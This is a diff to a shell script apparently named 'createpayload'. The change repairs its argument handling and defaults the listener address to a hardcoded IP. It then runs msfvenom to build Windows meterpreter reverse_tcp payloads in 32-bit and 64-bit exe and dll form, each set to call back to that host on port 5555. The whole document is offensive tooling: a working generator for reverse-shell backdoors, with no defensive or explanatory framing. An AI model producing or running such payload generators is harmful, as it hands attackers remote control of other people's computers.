@@ -6,11 +6,14 @@
 # Filename     : createpayload
 # Description  : 
 # ******************************************************
-if [[ $1.'x' == 'x' ]]; then
-    $1=120.24.159.2
+echo eg: pcreatepayload 120.24.159.2
+if [ ! -n "$1" ]; then
+    lhost='120.24.159.2'
+else
+    lhost=$1
 fi
-echo $1;
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=5555 -f exe > cmd_32.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$1 LPORT=5555 -f dll > cmd_32.dll
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=5555 -f exe > cmd_64.exe
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=5555 -f dll > cmd_64.dll
+echo $lhost
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=5555 -f exe > cmd_32.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=5555 -f dll > cmd_32.dll
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=5555 -f exe > cmd_64.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=5555 -f dll > cmd_64.dll
